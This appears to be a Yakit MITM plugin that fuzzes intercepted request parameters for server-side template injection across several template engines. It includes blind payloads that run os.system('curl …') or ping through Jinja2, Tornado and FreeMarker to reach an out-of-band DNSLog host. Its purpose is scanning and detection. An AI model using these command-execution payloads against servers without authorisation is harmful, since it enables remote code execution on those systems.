# mitm plugin template

yakit_output(MITM_PARAMS)

#-----------------------MITM Hooks I/O-------------------------
/*
#如何使用插件参数？

## 例如，如果你设置了一个参数为 url_keyword 的参数，可以通过 MITM_PARAMS 来使用它！
urlKeyword = MITM_PARAMS["url_keyword"]

# 如何输出给 Yakit 给用户查看？

yakit_output(i: any) // 可以只输出到 "Console 界面"
yakit_save(i: any)   // 可以输出并保存到数据库中，在 "插件输出" 中查看
*/
#----------------MITM Hooks Test And Quick Debug-----------------
/*
# __test__ 是 yakit mitm 插件用于调试的函数 【注意：这个函数在 MITM hooks劫持环境下不会被导入】

在这个函数中，你可以使用 yakit.GenerateYakitMITMHooksParams(method: string, url: string, opts ...http.Option) 来方便的生成可供 hooks 调用的参数，参考代码模版中的用法～

*/


#--------------------------WORKSPACE-----------------------------
__test__ = func() {
    results, err := yakit.GenerateYakitMITMHooksParams("GET", "https://example.com")
    if err != nil {
        return
    }
    isHttps, url, reqRaw, rspRaw, body = results

    mirrorHTTPFlow(results...)
    mirrorFilteredHTTPFlow(results...)
    mirrorNewWebsite(results...)
    mirrorNewWebsitePath(results...)
    mirrorNewWebsitePathParams(results...)
}


# mirrorHTTPFlow 会镜像所有的流量到这里，包括 .js / .css / .jpg 这类一般会被劫持程序过滤的请求
mirrorHTTPFlow = func(isHttps /*bool*/, url /*string*/, req /*[]byte*/, rsp /*[]byte*/, body /*[]byte*/) {
    
}



# mirrorNewWebsite 每新出现一个网站，这个网站的第一个请求，将会在这里被调用！
mirrorNewWebsite = func(isHttps /*bool*/, url /*string*/, req /*[]byte*/, rsp /*[]byte*/, body /*[]byte*/) {
    
}

# mirrorNewWebsitePath 每新出现一个网站路径，关于这个网站路径的第一个请求，将会在这里被传入回调
mirrorNewWebsitePath = func(isHttps /*bool*/, url /*string*/, req /*[]byte*/, rsp /*[]byte*/, body /*[]byte*/) {
    
}

# mirrorNewWebsitePathParams 每新出现一个网站路径且带有一些参数，参数通过常见位置和参数名去重，去重的第一个 HTTPFlow 在这里被调用
mirrorNewWebsitePathParams = func(isHttps /*bool*/, url /*string*/, req /*[]byte*/, rsp /*[]byte*/, body /*[]byte*/) {
    
}


# hijackHTTPRequest 每一个新的 HTTPRequest 将会被这个 HOOK 劫持，劫持后通过 forward(modifed) 来把修改后的请求覆盖，如果需要屏蔽该数据包，通过 drop() 来屏蔽
# ATTENTION-DEMO:
#   hijacked = str.ReplaceAll(string(req), "abc", "bcd")
#       1. forward(hijacked)：确认转发
#       2. drop() 丢包
#       3. 如果 forward 和 drop 都没有被调用，则使用默认数据流
#       4. 如果 drop 和 forward 在一个劫持中都被调用到了，以 drop 为准
/*
# Demo2 Best In Practice
hijackHTTPRequest = func(isHttps, url, req, forward, drop) {
    if str.Contains(string(req), "/products/plugins/plugin_11") {
        forward(str.ReplaceAll(string(req), "/products/plugins/plugin_11", "/products/plugins/plugin_create"))
    } 

    if str.Contains(string(req), "/products/plugins/plugin_12") {
        drop()
    } 
}
*/
hijackHTTPRequest = func(isHttps, url, req, forward /*func(modifiedRequest []byte)*/, drop /*func()*/) {

}

# hijackSaveHTTPFlow 是 Yakit 开放的 MITM 存储过程的 Hook 函数
# 这个函数允许用户在 HTTP 数据包存入数据库前进行过滤或者修改，增加字段，染色等
# 类似 hijackHTTPRequest
#    1. hijackSaveHTTPFlow 也采用了 JS Promise 的回调处理方案，用户可以在这个方法体内进行修改，修改完通过 modify(flow) 来进行保存
#    2. 如果用户不想保存数据包，使用 drop() 即可
# 
/**
案例:

hijackSaveHTTPFlow = func(flow, modify, drop) {
    if str.Contains(flow.Url, "/admin/") {
        flow.Red()   # 设置颜色
        modify(flow) # 保存
    }
}
*/

hijackSaveHTTPFlow = func(flow /* *yakit.HTTPFlow */, modify /* func(modified *yakit.HTTPFlow) */, drop/* func() */) {
    // responseBytes, _ = codec.StrconvUnquote(flow.Response)
    // if str.MatchAnyOfRegexp(responseBytes, "/admin/", "accessKey") { flow.Red(); modify(flow) }
}

checkErr = func(err) {
    if err != nil {
        yakit_output(sprintf("SSTI-DETECT error: %s", err.Error()))
        os.Exit(1)
    }
}

newResult = func(url, param, payload, respRaw,reqRaw, token) {
    return {"url": url, "param": param, "payload": payload, "respRaw": respRaw, "token":token,"reqRaw":reqRaw}
}

newPayload = func(template, min, max, expectValueFunc,engine) {
    return {"template": sprintf(template, min, max), "expectValue": expectValueFunc(min, max), "engine":engine}
}

newPayloadBlind = func(template,engine) {
    // server,token,err = risk.NewDNSLogDomain()
    // checkErr(err)
    return {"template": template, "engine":engine}
}

add = func(a,b){
    return a+b
}

sub = func(a,b){
    return a-b
}

div = func(a,b){
    return -a
}


// 将参数在页面中回显的payload 存入数据库中
EchoLog = func(result) {
    url = result.url
    param = result.param 
    payload = result.payload 
    respRaw = result.respRaw
    reqRaw = result.reqRaw
    payloadString := sprintf("%s=%s", param.Name(), payload.template)
    report = {"message": "SSTI", "payload": payloadString, "engine": payload.engine, "param_position": param.PositionVerbose()}

    risk.NewRisk(
        url,
        risk.title(sprintf("Echo for: %v %s: %s", url, param.PositionVerbose(), param.Name())),
        risk.details(report),
        risk.type("SSTI"),
        risk.payload(payloadString),
        risk.request(reqRaw), 
        risk.response(respRaw),
        risk.severity("mid"),
        risk.token(result.token),
    )
}

templateList = ["{{","{%","${","#(","<%"]


commonPayload = [newPayload("{{%d|add:%d}}",randn(1,99),randn(-299,-200),add, "Django"),
    newPayload("{{%d-%d}}",randn(1,99),randn(200,299), sub,"Jinja2,Django,Torando"),
    newPayload("{%% raw %d-%d-0%%}",randn(1,99),randn(200,299), sub,"Torando"),
    newPayload("{%%  widthratio %d %d -1 %%}",randn(1,99), -1, div,"Django"),
    newPayload("{%% print %d-%d %%}",randn(1,99),randn(200,299),sub,"Jinja2"),
    newPayload("${%d-%d}",randn(1,99),randn(200,299), sub,"FreeMarker"),
    newPayload("#set($foo = %d )#set( $value = $foo - %d )$value",randn(1,99),randn(200,299), sub,"Velocity"),
    newPayload("<%%- %d-%d %%>",randn(1,99),randn(200,299), sub,"EJS"),
    newPayload("<%%= %d-%d %%>",randn(1,99),randn(200,299), sub,"EJS")]

blindPayload = [newPayloadBlind(`{{config.__init__.__globals__.__builtins__.eval("__import__('os').system('ping %s')")}}`,"jinja2"),
    newPayloadBlind(`{{config.__init__.__globals__.__builtins__.eval("__import__('os').system('curl %s')")}}`,"jinja2"),
    newPayloadBlind(`{{escape.__globals__['__builtins__']['eval']("__import__('os').system('ping %s')")}}`,"Tornado"),
    newPayloadBlind(`{{escape.__globals__['__builtins__']['eval']("__import__('os').system('curl %s')")}}`,"Tornado"),
    newPayloadBlind(`{%% print config.__init__.__globals__.__builtins__.eval("__import__('os').system('ping %s')") %%}`,"jinja2"),
    newPayloadBlind(`{%% print config.__init__.__globals__.__builtins__.eval("__import__('os').system('curl %s')") %%}`,"jinja2"),
    newPayloadBlind(`<#assign value="freemarker.template.utility.Execute"?new()>${value("curl %s")}`,"FreeMarker"),
    newPayloadBlind(`<#assign value="freemarker.template.utility.Execute"?new()>${value("ping %s")}`,"FreeMarker")]


// ! 检验模板是否可用,产生黑名单,减少后续请求
BlackListCheck = func(param){
    // ! 测试两个正常页面，比较页面相似度，选择较低阈值
    resp,err = param.Fuzz("1").Exec()
    a = <- resp
    respBody1, err = str.ExtractBodyFromHTTPResponseRaw(a.ResponseRaw)

    resp,err = param.Fuzz("2").Exec()
    a = <- resp
    respBody2, err = str.ExtractBodyFromHTTPResponseRaw(a.ResponseRaw)

    rawSimilarity = str.CalcSimilarity(respBody1, respBody2)

    rule = rawSimilarity < 0.95 ? rawSimilarity:0.95

    // ! 根据页面相似度看是否被waf拦截，相似度低则添加到黑名单
    BlackList = []
    for _,templateTag := range templateList {
        resp,err = param.Fuzz(templateTag).Exec()
        a = <- resp
        StatusCode:= a.Response.StatusCode
        
        // println(StatusCode)

        // ! 如果页面报错默认不为黑名单，因为只有当特殊字符生效时才会报错 
        if  StatusCode == 500{
            continue
        } 
        respBody, err = str.ExtractBodyFromHTTPResponseRaw(a.ResponseRaw)

        if str.CalcSimilarity(respBody, respBody2) < rule{
            BlackList = append(BlackList,templateTag)
            break
        }
        
    }
    // dump(BlackList)
    return BlackList      
}


// ! 普通有回显的SSTI
sstiFuzz = func(param, url, BlackList){
    // println(param.name())
    
    for _,payload := range commonPayload {
        
        flag = true
        for _,templateTag := range BlackList {
            if templateTag in payload.template{
                flag = false
            }
        }
        if flag{
            // println(payload.template+"\n----------")
            resp,err = param.Fuzz(payload.template).Exec()
            a = <- resp
            respBody, err = str.ExtractBodyFromHTTPResponseRaw(a.ResponseRaw)
            
            if sprint(payload.expectValue) in string(respBody){
                res = newResult(url, param, payload, string(a.ResponseRaw),string(a.RequestRaw),"-")
                EchoLog(res)
            }
        }
    }
}


// ! 无回显的SSTI
sstiFuzzBlind = func(param, url, BlackList){
    for _,payload := range blindPayload {
        flag = true
        for _,templateTag := range BlackList {
            if templateTag in payload.template{
                flag = false
            }
        }
        if flag{
            
            server,token,err = risk.NewDNSLogDomain()
            checkErr(err)

            blindTemplate = sprintf(payload.template,server)

            // println(blindTemplate)

            // param.Fuzz(payload.template).Show()

            resp,err = param.Fuzz(blindTemplate).Exec()
            
            // a = <- resp
            // respBody, err = str.ExtractBodyFromHTTPResponseRaw(a.ResponseRaw)
            payloadLog = {
                "template":blindTemplate,
                "engine":payload.engine}

            go func(url, payload,token, param){
                defer wg.Done()
                wg.add(1)

                res = risk.CheckDNSLogByToken(token)
                // dump(res)

                if len(res[0]) > 0{
                    res = newResult(url, param, payload, respBody, "",token)
                    EchoLog(res)
                }
            }(url, payloadLog, token, param)
        }
    }
}

// ! 一个参数的测试任务
fuzzTask = func(param,url){
    BlackList =  BlackListCheck(param)
    sstiFuzz(param,url,BlackList)
    sstiFuzzBlind(param,url,BlackList)
    
}



wg = sync.NewWaitGroup()
test = func() {
    results, err := yakit.GenerateYakitMITMHooksParams("GET", "http://127.0.0.1:5000/level/1?code=1",http.header("Content-Type","application/x-www-form-urlencoded"))
    if err != nil {
        return
    }
    isHttps, url, reqRaw, rspRaw, body = results

    mirrorFilteredHTTPFlow(results...)
}

mirrorFilteredHTTPFlow = func(ishttps, url, req, rsp, body) {
    threads = 10
    // 构造fuzz请求
    freq, err = fuzz.HTTPRequest(req, fuzz.https(ishttps))
    // 获取参数，包含post json、post form、get参数、cookie参数 路径参数（会自动过滤PHPSESSID、_ga、_gid等参数）
    params = freq.GetCommonParams()    
    for _,param := range params {
        fuzzTask(param,url)
    }  
}

wg.Wait()





/* 定义速查

*yakit.HTTPFlow 定义：
type palm/common/yakgrpc/yakit.(HTTPFlow) struct {
  Fields(可用字段):
      Model: gorm.Model
      Hash: string
      IsHTTPS: bool
      Url: string
      Path: string
      Method: string
      BodyLength: int64
      ContentType: string
      StatusCode: int64
      SourceType: string
      Request: string                   # 需要通过 codec.StrconvUnquote 解码
      Response: string                  # 需要通过 codec.StrconvUnquote 解码
      GetParamsTotal: int
      PostParamsTotal: int
      CookieParamsTotal: int
      IPAddress: string
      RemoteAddr: string
      IPInteger: int
      Tags: string
  StructMethods(结构方法/函数):
  PtrStructMethods(指针结构方法/函数):
      func AddTag(v1: string)
      func BeforeSave() return(error)
      func Blue()                                           # 蓝色
      func CalcHash() return(string)                         
      func ColorSharp(v1: string)
      func Cyan()                                           # 天蓝色
      func Green()                                          # 绿色
      func Grey()                                           # 灰色
      func Orange()                                         # 橙色
      func Purple()                                         # 紫色
      func Red()                                            # 红色
      func RemoteColor()
      func ToGRPCModel() return(*ypb.HTTPFlow, error)
      func ToGRPCModelFull() return(*ypb.HTTPFlow, error)
      func Yellow()                                         # 黄色
}
*/
